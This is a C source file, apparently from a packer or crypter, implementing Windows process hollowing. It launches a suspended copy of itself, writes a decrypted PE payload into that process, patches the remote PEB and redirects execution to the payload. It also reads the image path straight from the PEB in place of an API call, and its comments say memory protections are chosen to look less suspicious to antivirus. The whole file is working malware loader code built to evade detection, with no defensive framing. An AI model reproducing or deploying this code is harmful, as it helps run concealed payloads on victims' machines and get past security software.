#include <stdint.h>
#include <stdbool.h>
#include <windows.h>
#include <winternl.h>
#include "headers/injection.h"
#include "headers/unpacker.h"

// instead of API call GetModuleFileNameA
void custom_GetModuleFileNameA(char* out, DWORD size)
{
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PRTL_USER_PROCESS_PARAMETERS pProcParams = pPeb->ProcessParameters;
    UNICODE_STRING* pImagePath = &pProcParams->ImagePathName;
    int len = WideCharToMultiByte(CP_ACP, 0, pImagePath->Buffer, pImagePath->Length / 2, out, size, NULL, NULL);
    out[len] = 0;
}

int ProcessHollowing(uint8_t* decrypted)
{
    ProcessContext processCtx = {0};
    processCtx.pe = decrypted;
    processCtx.DOSHeader = (PIMAGE_DOS_HEADER)processCtx.pe;
    processCtx.NtHeader = (IMAGE_NT_HEADERS64*)((uint8_t*)processCtx.pe + processCtx.DOSHeader->e_lfanew);

    if (processCtx.NtHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        return 1;
    }

    custom_GetModuleFileNameA(processCtx.currentFilePath, MAX_PATH);
    
    if (!CreateProcessA(processCtx.currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &processCtx.SI, &processCtx.PI))
    {
        return 1;
    }

    processCtx.CTX = (CONTEXT*)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
    if (!processCtx.CTX)
    {
        TerminateProcess(processCtx.PI.hProcess, 1);
        return 1;
    }

    processCtx.CTX->ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(processCtx.PI.hThread, processCtx.CTX))
    {
        goto cleanup;
    }

    processCtx.pImageBase = VirtualAllocEx(
        processCtx.PI.hProcess,
        (LPVOID)(processCtx.NtHeader->OptionalHeader.ImageBase),
        processCtx.NtHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!processCtx.pImageBase)
    {
        goto cleanup;
    }

    WriteProcessMemory(processCtx.PI.hProcess, processCtx.pImageBase, processCtx.pe, 
        processCtx.NtHeader->OptionalHeader.SizeOfHeaders, NULL);

    for (size_t i = 0; i < processCtx.NtHeader->FileHeader.NumberOfSections; i++)
    {
        processCtx.SectionHeader = (PIMAGE_SECTION_HEADER)(
            (uint8_t*)processCtx.pe + processCtx.DOSHeader->e_lfanew + 
            sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER))
        );

        WriteProcessMemory(
            processCtx.PI.hProcess,
            (LPVOID)((uintptr_t)processCtx.pImageBase + processCtx.SectionHeader->VirtualAddress),
            (LPVOID)((uintptr_t)processCtx.pe + processCtx.SectionHeader->PointerToRawData),
            processCtx.SectionHeader->SizeOfRawData,
            NULL
        );

        /* Set correct memory protection for each section. 
        Because PAGE_EXECUTE_READWRITE is too suspicious for antiviruses */
        
        DWORD protect = PAGE_NOACCESS;
        DWORD chars = processCtx.SectionHeader->Characteristics;
        if (chars & IMAGE_SCN_MEM_EXECUTE)
        {
            if (chars & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_EXECUTE_READWRITE;
            else if (chars & IMAGE_SCN_MEM_READ)
                protect = PAGE_EXECUTE_READ;
            else
                protect = PAGE_EXECUTE;
        } else {
            if (chars & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_READWRITE;
            else if (chars & IMAGE_SCN_MEM_READ)
                protect = PAGE_READONLY;
            else
                protect = PAGE_NOACCESS;
        }
        DWORD oldProtect;
        VirtualProtectEx(
            processCtx.PI.hProcess,
            (LPVOID)((uintptr_t)processCtx.pImageBase + processCtx.SectionHeader->VirtualAddress),
            processCtx.SectionHeader->Misc.VirtualSize,
            protect,
            &oldProtect
        );
    }

    // Updating ImageBaseAddress in remote PEB
    WriteProcessMemory(
        processCtx.PI.hProcess,
        (LPVOID)(processCtx.CTX->Rdx + 0x10),
        &processCtx.NtHeader->OptionalHeader.ImageBase,
        sizeof(uint64_t),
        NULL
    );

    processCtx.CTX->Rip = (uintptr_t)processCtx.pImageBase + processCtx.NtHeader->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(processCtx.PI.hThread, processCtx.CTX);
    ResumeThread(processCtx.PI.hThread);
    WaitForSingleObject(processCtx.PI.hProcess, INFINITE);

    VirtualFree(processCtx.CTX, 0, MEM_RELEASE);
    return 0;

cleanup:
    if (processCtx.CTX)
    {
        VirtualFree(processCtx.CTX, 0, MEM_RELEASE);
    }
    TerminateProcess(processCtx.PI.hProcess, 1);
    return 1;
}
